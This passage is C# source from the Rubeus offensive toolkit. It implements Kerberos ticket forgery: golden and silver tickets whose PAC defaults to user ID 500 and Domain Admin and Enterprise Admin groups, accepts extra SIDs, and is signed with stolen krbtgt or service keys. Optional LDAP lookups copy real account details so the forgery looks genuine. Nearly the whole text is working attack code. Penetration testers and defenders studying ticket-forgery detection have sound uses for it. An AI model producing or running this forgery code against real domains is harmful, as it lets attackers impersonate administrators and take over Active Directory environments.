using Rubeus.Kerberos;
using Rubeus.Kerberos.PAC;
using Rubeus.lib.Interop;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Security.Principal;
using System.Text.RegularExpressions;

namespace Rubeus
{

    public class PacOptions
    {
        public int? UserId = null;
        public string GroupIds = "";
        public string ExtraSids = "";
        public string DisplayName = "";
        public short? LogonCount = null;
        public short? BadPwdCount = null;
        public DateTime? LastLogon = null;
        public DateTime? LogoffTime = null;
        public DateTime? PwdLastSet = null;
        public int? maxPassAge = null;
        public int? minPassAge = null;
        public int? PrimaryGroupId = null;
        public string HomeDir = "";
        public string HomeDrive = "";
        public string ProfilePath = "";
        public string ScriptPath = "";
        public string ResourceGroupDomainSid = "";
        public List<int> ResourceGroupIds = null;
        public Interop.PacUserAccountControl UserAccountControl = Interop.PacUserAccountControl.NORMAL_ACCOUNT;
    }

    public class TicketForgeOptions
    {
        // krbtgt key information
        public byte[] KrbtgtKey = null;
        public Interop.KERB_CHECKSUM_ALGORITHM KrbtgtEtype = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
        // ldap information
        public bool Ldap = false;
        public System.Net.NetworkCredential LdapCredentials = null;
        // domain and DC information
        public string domainSid = "";
        public string DomainName = "";
        public string netbiosName = "";
        public string DomainController = "";
        // ticket flags
        public Interop.TicketFlags TicketFlags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent;
        // ticket time information
        public DateTime? startTime = null;
        public DateTime? rangeEnd = null;
        public string rangeInterval = "1d";
        public DateTime? AuthTime = null;
        public string EndTime = "";
        public string RenewTill = "";
        // PAC
        public PacOptions Pac = new PacOptions();
        // arguments to deal with resulting ticket(s)
        public string outfile = null;
        public bool ptt = false;
        // print a command to rebuild the ticket(s)
        public bool printcmd = false;
        // arguments for unusual tickets
        public string cName = null;
        public string cRealm = null;
        public string s4uProxyTarget = null;
        public string s4uTransitedServices = null;
        public bool IncludeAuthData = false;
    }


    public class ForgeTickets
    {
        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, TicketForgeOptions options)
        {
            // Copy values that get modified in this function, so that we don't modify what the caller passed in
            string domain = options.DomainName;
            string domainController = options.DomainController;
            DateTime? startTime = options.startTime; 
            byte[] krbtgtKey = options.KrbtgtKey;
            string cName = options.cName;
            string cRealm = options.cRealm;
            DateTime? authTime = options.AuthTime;

            // Regular local variables
            int? minPassAge = null;
            int? maxPassAge = null;
            int counter = 0;
            bool ldapSsl = true;

            // initialise LogonInfo section and set defaults
            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
            kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(user);
            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
            kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");
            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
            kvi.LogonTime = new Ndr._FILETIME(((DateTime)options.startTime).AddSeconds(-1));
            kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
            kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
            kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
            kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
            kvi.LogonCount = 0;
            kvi.BadPasswordCount = 0;
            kvi.UserId = 500;
            kvi.PrimaryGroupId = 513;
            if (string.IsNullOrEmpty(options.Pac.GroupIds))
            {
                kvi.GroupCount = 5;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[] {
                    new Ndr._GROUP_MEMBERSHIP(520, 0),
                    new Ndr._GROUP_MEMBERSHIP(512, 0),
                    new Ndr._GROUP_MEMBERSHIP(513, 0),
                    new Ndr._GROUP_MEMBERSHIP(519, 0),
                    new Ndr._GROUP_MEMBERSHIP(518, 0),
                };
            }
            kvi.UserAccountControl = (int)options.Pac.UserAccountControl;
            kvi.UserFlags = 0;
            if (String.IsNullOrEmpty(options.Pac.ExtraSids))
            {
                kvi.SidCount = 0;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES() };
            }

            // determine domain if not supplied
            string[] parts = sname.Split('/');
            if (String.IsNullOrEmpty(options.DomainName))
            {
                if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                {
                    Console.WriteLine("[X] TGT or referral TGT requires /domain to be passed.");
                    return;
                }
                else if ((parts.Length == 1) && (sname.Split('@').Length == 1))
                {
                    Console.WriteLine("[X] SPN has to be in the format 'svc/host.domain.com' or 'host@domain.com'.");
                    return;
                }
                else if (parts.Length > 1)
                {
                    domain = parts[1].Substring(parts[1].IndexOf('.') + 1);
                    string[] domainParts = domain.Split(':');
                    if (domainParts.Length > 1)
                    {
                        domain = domainParts[0];
                    }
                }
                else if (sname.Split('@').Length > 1)
                {
                    domain = sname.Split('@')[1];
                }
                else
                {
                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);
                    return;
                }
            }
            if (String.IsNullOrEmpty(options.netbiosName))
            {
                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf('.')).ToUpper());
            }

            // if /ldap was passed make the LDAP queries
            if (options.Ldap)
            {
                // try LDAPS and fail back to LDAP
                List<IDictionary<string, Object>> ActiveDirectoryObjects = null;
                if (String.IsNullOrEmpty(domainController))
                {
                    domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                }
                Console.WriteLine("[*] Trying to query LDAP using LDAPS for user information on domain controller {0}", domainController);
                ActiveDirectoryObjects = Networking.GetLdapQuery(options.LdapCredentials, "", domainController, domain, $"(samaccountname={user})", ldapSsl);
                if (ActiveDirectoryObjects == null)
                {
                    ldapSsl = false;
                    Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");
                    ActiveDirectoryObjects = Networking.GetLdapQuery(options.LdapCredentials, "", domainController, domain, $"(samaccountname={user})", ldapSsl);
                }

                foreach (var userObject in ActiveDirectoryObjects)
                {
                    string objectSid = (string)userObject["objectsid"];
                    string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));

                    // parse the UAC field and set in the PAC
                    if (options.Pac.UserAccountControl == Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                    {
                        Interop.LDAPUserAccountControl ldapUac = (Interop.LDAPUserAccountControl)userObject["useraccountcontrol"];
                        kvi.UserAccountControl = LdapUacToPacUac(ldapUac);
                    }

                    List<IDictionary<string, Object>> adObjects = null;

                    // build group and domain policy filter
                    string filter = "";
                    string outputText = "";
                    if (string.IsNullOrEmpty(options.Pac.GroupIds))
                    {
                        if (userObject.ContainsKey("memberof"))
                        {
                            foreach (string groupDN in (string[])userObject["memberof"])
                            {
                                filter += String.Format("(distinguishedname={0})", groupDN);
                            }
                            outputText += "group";
                        }
                    }

                    if (options.Pac.PrimaryGroupId == null)
                    {
                        filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);
                    }

                    if (options.Pac.minPassAge == null || (options.Pac.maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))
                    {
                        filter += "(&(objectClass=groupPolicyContainer)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))";
                        if (String.IsNullOrEmpty(outputText))
                        {
                            outputText = "domain policy";
                        }
                        else
                        {
                            outputText = String.Format("{0} and domain policy", outputText);
                        }
                    }

                    if (!String.IsNullOrEmpty(filter))
                    {
                        // Try to get group and domain policy information from LDAP
                        Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, options.DomainController);
                        adObjects = Networking.GetLdapQuery(options.LdapCredentials, "", options.DomainController, options.DomainName, String.Format("(|{0})", filter), ldapSsl);
                        if (adObjects == null)
                        {
                            Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);
                        }
                        else
                        {
                            if (userObject.ContainsKey("memberof"))
                            {
                                kvi.GroupCount = ((string[])userObject["memberof"]).Length + 1;
                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[((string[])userObject["memberof"]).Length + 1];
                            }
                            else
                            {
                                kvi.GroupCount = 1;
                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[1];
                            }
                            counter = 0;
                            foreach (var o in adObjects)
                            {
                                if (o.ContainsKey("gpcfilesyspath"))
                                {
                                    string gptTmplPath = String.Format("{0}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf", (string)o["gpcfilesyspath"]);
                                    gptTmplPath = gptTmplPath.Replace(String.Format("\\\\{0}\\", domain), String.Format("\\\\{0}\\", domainController));
                                    Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, options.LdapCredentials);

                                    if (gptTmplObject == null)
                                    {
                                        Console.WriteLine("[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.");
                                        continue;
                                    }

                                    if (options.Pac.minPassAge == null)
                                    {
                                        minPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MinimumPasswordAge"]);
                                        if (minPassAge > 0)
                                        {
                                            kvi.PasswordCanChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)minPassAge));
                                        }
                                    }
                                    if (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
                                    {
                                        maxPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MaximumPasswordAge"]);
                                        if (maxPassAge > 0)
                                        {
                                            kvi.PasswordMustChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)maxPassAge));
                                        }
                                    }
                                }
                                else
                                {
                                    string groupSid = (string)o["objectsid"];
                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, counter, 1);
                                    counter += 1;
                                }
                            }
                        }
                    }

                    // preform the netbios name lookup
                    if (String.IsNullOrEmpty(options.netbiosName))
                    {
                        Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);

                        // first get forest root
                        string forestRoot = null;
                        try
                        {
                            forestRoot = System.DirectoryServices.ActiveDirectory.Forest.GetCurrentForest().RootDomain.Name;
                        }
                        catch
                        {
                            Console.WriteLine("[!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming {0} is the forest root", domain);
                            forestRoot = options.DomainName;
                        }

                        string configRootDomain = options.DomainName;
                        if (!options.DomainName.Equals(forestRoot))
                            configRootDomain = forestRoot;

                        string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));

                        adObjects = Networking.GetLdapQuery(options.LdapCredentials, configOU, options.DomainController, options.DomainName, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ldapSsl);
                        if (adObjects == null)
                        {
                            Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");
                        }
                        else
                        {
                            foreach (var o in adObjects)
                            {
                                if (o.ContainsKey("netbiosname"))
                                {
                                    kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)o["netbiosname"]);
                                }
                            }
                        }
                    }

                    // set the rest of the PAC fields
                    if (userObject.ContainsKey("displayname"))
                    {
                        kvi.FullName = new Ndr._RPC_UNICODE_STRING((string)userObject["displayname"]);
                    }

                    if (String.IsNullOrEmpty(options.domainSid))
                    {
                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
                    }
                    kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
                    kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
                    if ((DateTime)userObject["lastlogon"] != DateTime.MinValue)
                    {
                        kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject["lastlogon"]);
                    }
                    if ((DateTime)userObject["lastlogoff"] != DateTime.MinValue)
                    {
                        kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject["lastlogoff"]);
                    }
                    if ((DateTime)userObject["pwdlastset"] != DateTime.MinValue)
                    {
                        kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)userObject["pwdlastset"]);
                    }
                    kvi.PrimaryGroupId = Int32.Parse((string)userObject["primarygroupid"]);
                    kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-') + 1));
                    if (userObject.ContainsKey("homedirectory"))
                    {
                        kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING((string)userObject["homedirectory"]);
                    }
                    if (userObject.ContainsKey("homedrive"))
                    {
                        kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING((string)userObject["homedrive"]);
                    }
                    if (userObject.ContainsKey("profilepath"))
                    {
                        kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING((string)userObject["profilepath"]);
                    }
                    if (userObject.ContainsKey("scriptpath"))
                    {
                        kvi.LogonScript = new Ndr._RPC_UNICODE_STRING((string)userObject["scriptpath"]);
                    }

                }

            }
            else if (String.IsNullOrEmpty(options.domainSid))
            {
                throw new RubeusException("To forge tickets without specifying '/ldap', '/sid' is required.");
            }

            // initialize some structures
            KRB_CRED cred = new KRB_CRED();
            KrbCredInfo info = new KrbCredInfo();

            Console.WriteLine("[*] Building PAC");

            // overwrite any LogonInfo fields here sections
            if (!String.IsNullOrEmpty(options.netbiosName))
            {
                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(options.netbiosName);
            }
            if (!String.IsNullOrEmpty(options.domainSid))
            {
                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(options.domainSid));
            }
            if (!String.IsNullOrEmpty(options.Pac.GroupIds))
            {
                List<int> allGroups = new List<int>();
                foreach (string gid in options.Pac.GroupIds.Split(','))
                {
                    try
                    {
                        allGroups.Add(Int32.Parse(gid));
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[X] Error unable to parse group id {0}: {1}", gid, e.Message);
                    }
                }
                if ((options.Pac.PrimaryGroupId != null) && !allGroups.Contains((int)options.Pac.PrimaryGroupId))
                {
                    allGroups.Add((int)options.Pac.PrimaryGroupId);
                }
                int numOfGroups = allGroups.Count;
                kvi.GroupCount = numOfGroups;
                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[numOfGroups];
                counter = 0;
                foreach (int gid in allGroups)
                {
                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(gid, 7) }, 0, kvi.GroupIds, counter, 1);
                    counter += 1;
                }
            }
            if (!String.IsNullOrEmpty(options.Pac.ExtraSids))
            {
                string[] splitSids = options.Pac.ExtraSids.Split(',');
                int numOfSids = splitSids.Length;
                kvi.SidCount = numOfSids;
                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
                counter = 0;
                foreach (string s in splitSids)
                {
                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, counter, 1);
                    counter += 1;
                }
            }
            if (!String.IsNullOrEmpty(options.Pac.ResourceGroupDomainSid) && (options.Pac.ResourceGroupIds != null))
            {
                try
                {
                    kvi.ResourceGroupDomainSid = new Ndr._RPC_SID(new SecurityIdentifier(options.Pac.ResourceGroupDomainSid));
                    kvi.ResourceGroupCount = options.Pac.ResourceGroupIds.Count;
                    kvi.ResourceGroupIds = new Ndr._GROUP_MEMBERSHIP[options.Pac.ResourceGroupIds.Count];
                    counter = 0;
                    foreach (int rgroup in options.Pac.ResourceGroupIds)
                    {
                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(rgroup, 7) }, 0, kvi.ResourceGroupIds, counter, 1);
                        counter += 1;
                    }
                }
                catch (Exception ex)
                {
                    throw new RubeusException("Error setting up resource group IDs in forged ticket: " + ex.Message);
                }
            }
            if (kvi.SidCount > 0)
            {
                kvi.UserFlags = kvi.UserFlags | (int)Interop.PacUserFlags.EXTRA_SIDS;
            }
            if (kvi.ResourceGroupCount > 0)
            {
                kvi.UserFlags = kvi.UserFlags | (int)Interop.PacUserFlags.RESOURCE_GROUPS;
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                string dcName = Networking.GetDCNameFromIP(domainController);
                if (dcName != null)
                {
                    kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                }
            }
            if (!String.IsNullOrEmpty(options.Pac.DisplayName))
            {
                kvi.FullName = new Ndr._RPC_UNICODE_STRING(options.Pac.DisplayName);
            }
            if (options.Pac.LogonCount != null)
            {
                kvi.LogonCount = (short)options.Pac.LogonCount;
            }
            if (options.Pac.BadPwdCount != null)
            {
                kvi.BadPasswordCount = (short)options.Pac.BadPwdCount;
            }
            if (options.Pac.LastLogon != null)
            {
                kvi.LogonTime = new Ndr._FILETIME((DateTime)options.Pac.LastLogon);
            }
            if (options.Pac.LogoffTime != null)
            {
                kvi.LogoffTime = new Ndr._FILETIME((DateTime)options.Pac.LogoffTime);
            }
            if (options.Pac.PwdLastSet != null)
            {
                kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)options.Pac.PwdLastSet);
            }
            if (options.Pac.minPassAge != null)
            {
                try
                {
                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
                    if (options.Pac.minPassAge > 0)
                    {
                        kvi.PasswordCanChange = new Ndr._FILETIME(passLastSet.AddDays((double)options.Pac.minPassAge));
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Something went wrong setting the PasswordCanChange field, perhaps PasswordLastSet is not configured properly");
                }
            }
            if (options.Pac.maxPassAge != null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
            {
                try
                {
                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
                    if (options.Pac.maxPassAge > 0)
                    {
                        kvi.PasswordMustChange = new Ndr._FILETIME(passLastSet.AddDays((double)options.Pac.maxPassAge));
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Something went wrong setting the PasswordMustChange field, perhaps PasswordLastSet is not configured properly");
                }
            }
            if (options.Pac.UserId != null)
            {
                kvi.UserId = (int)options.Pac.UserId;
            }
            if (options.Pac.PrimaryGroupId != null)
            {
                kvi.PrimaryGroupId = (int)options.Pac.PrimaryGroupId;
            }
            if (!String.IsNullOrEmpty(options.Pac.HomeDir))
            {
                kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(options.Pac.HomeDir);
            }
            if (!String.IsNullOrEmpty(options.Pac.HomeDrive))
            {
                kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(options.Pac.HomeDrive);
            }
            if (!String.IsNullOrEmpty(options.Pac.ProfilePath))
            {
                kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(options.Pac.ProfilePath);
            }
            if (!String.IsNullOrEmpty(options.Pac.ScriptPath))
            {
                kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(options.Pac.ScriptPath);
            }


            // generate a random session key, encryption type and checksum types
            Random random = new Random();
            byte[] randKeyBytes;
            SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
            SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
            int svrSigLength = 12, kdcSigLength = 12;
            if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                svrSigLength = 16;
                kdcSigLength = 16;
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            // if the krbtgt key is specified, use the checksum type also specified
            if (options.KrbtgtKey != null)
            {
                kdcSigData.SignatureType = options.KrbtgtEtype;
                if ((options.KrbtgtEtype == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (options.KrbtgtEtype == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                {
                    kdcSigLength = 12;
                }
                else
                {
                    kdcSigLength = 16;
                }
            }

            // set krbKey to serviceKey if none is given
            if (krbtgtKey == null)
            {
                krbtgtKey = serviceKey;
            }

            // output some ticket information relevent to all tickets generated
            Console.WriteLine("");
            Console.WriteLine("[*] Domain         : {0} ({1})", domain.ToUpper(), kvi.LogonDomainName);
            Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());
            Console.WriteLine("[*] UserId         : {0}", kvi.UserId);
            if (kvi.GroupCount > 0)
            {
                Console.WriteLine("[*] Groups         : {0}", kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
            }
            if (kvi.SidCount > 0)
            {
                Console.WriteLine("[*] ExtraSIDs      : {0}", kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
            }
            Console.WriteLine("[*] ServiceKey     : {0}", Helpers.ByteArrayToString(serviceKey));
            Console.WriteLine("[*] ServiceKeyType : {0}", svrSigData.SignatureType);
            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbtgtKey));
            Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);
            Console.WriteLine("[*] Service        : {0}", parts[0]);
            Console.WriteLine("[*] Target         : {0}", parts[1]);
            Console.WriteLine("");

            // loop incase we need to generate multiple tickets as everything below this are effected
            do
            {
                // Create PacInfoBuffers
                kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);
                LogonInfo li = new LogonInfo(kvi);

                if (String.IsNullOrEmpty(options.cName))
                    cName = user;
                if (String.IsNullOrEmpty(cRealm))
                    cRealm = domain;

                ClientName cn = null;
                if (parts[0].Equals("krbtgt") && !cRealm.Equals(domain))
                    cn = new ClientName((DateTime)startTime, String.Format("{0}@{1}@{1}", user, domain.ToUpper()));
                else
                    cn = new ClientName((DateTime)startTime, user);

                UpnDns upnDns = new UpnDns(0, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));

                S4UDelegationInfo s4u = null;
                if (!String.IsNullOrEmpty(options.s4uProxyTarget) && !String.IsNullOrEmpty(options.s4uTransitedServices))
                {
                    s4u = new S4UDelegationInfo(options.s4uProxyTarget, options.s4uTransitedServices.Split(','));
                }

                Console.WriteLine("[*] Generating EncTicketPart");

                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpper(), cName, options.TicketFlags, cn.ClientId);

                // set other times in EncTicketPart
                DateTime? check = null;
                decTicketPart.authtime = (DateTime)options.AuthTime;
                if (!String.IsNullOrEmpty(options.EndTime))
                {
                    check = Helpers.FutureDate((DateTime)startTime, options.EndTime);
                    if (check != null)
                    {
                        decTicketPart.endtime = (DateTime)check;
                    }
                }
                if (!String.IsNullOrEmpty(options.RenewTill))
                {
                    check = Helpers.FutureDate((DateTime)startTime, options.RenewTill);
                    if (check != null)
                    {
                        decTicketPart.renew_till = (DateTime)check;
                    }
                }

                if (decTicketPart.authorization_data == null)
                {
                    decTicketPart.authorization_data = new List<AuthorizationData>();
                }

                // generate blank PAC for TicketChecksum for service tickets
                SignatureData ticketSigData = null;
                if (!(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
                {
                    ticketSigData = new SignatureData(PacInfoBufferType.TicketChecksum);
                    ticketSigData.SignatureType = kdcSigData.SignatureType;
                    ADIfRelevant ifrelevant = new ADIfRelevant();
                    ADWin2KPac win2KPac = new ADWin2KPac();
                    win2KPac.Pac = null;
                    win2KPac.ad_data = new byte[] { 0x00 };
                    decTicketPart.authorization_data.Add(new ADIfRelevant(win2KPac));
                }

                // set extra AuthorizationData sections
                if (options.IncludeAuthData)
                {
                    ADIfRelevant ifrelevant = new ADIfRelevant();
                    ADRestrictionEntry restrictions = new ADRestrictionEntry();
                    ADKerbLocal kerbLocal = new ADKerbLocal();
                    ifrelevant.ADData.Add(restrictions);
                    ifrelevant.ADData.Add(kerbLocal);
                    decTicketPart.authorization_data.Add(ifrelevant);
                }

                // now we have the extra auth data sections, calculate TicketChecksum
                if (!(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
                {
                    ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbtgtKey, kdcSigData.SignatureType);
                }

                // clear signatures
                Console.WriteLine("[*] Signing PAC");
                svrSigData.Signature = new byte[svrSigLength];
                kdcSigData.Signature = new byte[kdcSigLength];
                Array.Clear(svrSigData.Signature, 0, svrSigLength);
                Array.Clear(kdcSigData.Signature, 0, kdcSigLength);

                // add sections to the PAC, get bytes and generate checksums
                List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
                if (s4u != null)
                {
                    PacInfoBuffers.Add(s4u);
                }
                PacInfoBuffers.Add(li);
                PacInfoBuffers.Add(cn);
                PacInfoBuffers.Add(upnDns);
                PacInfoBuffers.Add(svrSigData);
                PacInfoBuffers.Add(kdcSigData);
                if (ticketSigData != null)
                {
                    PacInfoBuffers.Add(ticketSigData);
                }
                PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
                byte[] ptBytes = pt.Encode();
                byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
                byte[] kdcSig = Crypto.KerberosChecksum(krbtgtKey, svrSig, kdcSigData.SignatureType);

                // add checksums
                svrSigData.Signature = svrSig;
                kdcSigData.Signature = kdcSig;
                PacInfoBuffers = new List<PacInfoBuffer>();
                if (s4u != null)
                {
                    PacInfoBuffers.Add(s4u);
                }
                PacInfoBuffers.Add(li);
                PacInfoBuffers.Add(cn);
                PacInfoBuffers.Add(upnDns);
                PacInfoBuffers.Add(svrSigData);
                PacInfoBuffers.Add(kdcSigData);
                if (ticketSigData != null)
                {
                    PacInfoBuffers.Add(ticketSigData);
                }
                pt = new PACTYPE(0, PacInfoBuffers);

                // add the PAC to the ticket
                decTicketPart.SetPac(pt);


                // encrypt the EncTicketPart
                Console.WriteLine("[*] Encrypting EncTicketPart");
                byte[] encTicketData = decTicketPart.Encode().Encode();
                byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);

                // initialize the ticket and add the enc_part
                Console.WriteLine("[*] Generating Ticket");
                Ticket ticket = new Ticket(domain.ToUpper(), sname);
                ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);

                // add the ticket
                cred.tickets.Add(ticket);

                // [0] add in the session key
                info.key.keytype = (int)etype;
                info.key.keyvalue = randKeyBytes;

                // [1] prealm (domain)
                info.prealm = ticket.realm;

                // [2] pname (user)
                info.pname.name_type = decTicketPart.cname.name_type;
                info.pname.name_string = decTicketPart.cname.name_string;

                // [3] flags
                info.flags = options.TicketFlags;

                // [4] authtime (not required)
                info.authtime = decTicketPart.authtime;

                // [5] starttime
                info.starttime = decTicketPart.starttime;

                // [6] endtime
                info.endtime = decTicketPart.endtime;

                // [7] renew-till
                info.renew_till = decTicketPart.renew_till;

                // [8] srealm
                info.srealm = ticket.realm;

                // [9] sname
                info.sname.name_type = ticket.sname.name_type;
                info.sname.name_string = ticket.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                Console.WriteLine("[*] Generated KERB-CRED");



                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (parts[0] == "krbtgt")
                {
                    Console.WriteLine("[*] Forged a TGT for '{0}@{1}'", info.pname.name_string[0], domain);
                }
                else
                {
                    Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
                }
                Console.WriteLine("");

                // dates unique to this ticket
                Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
                Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(CultureInfo.CurrentCulture));

                Console.WriteLine("");

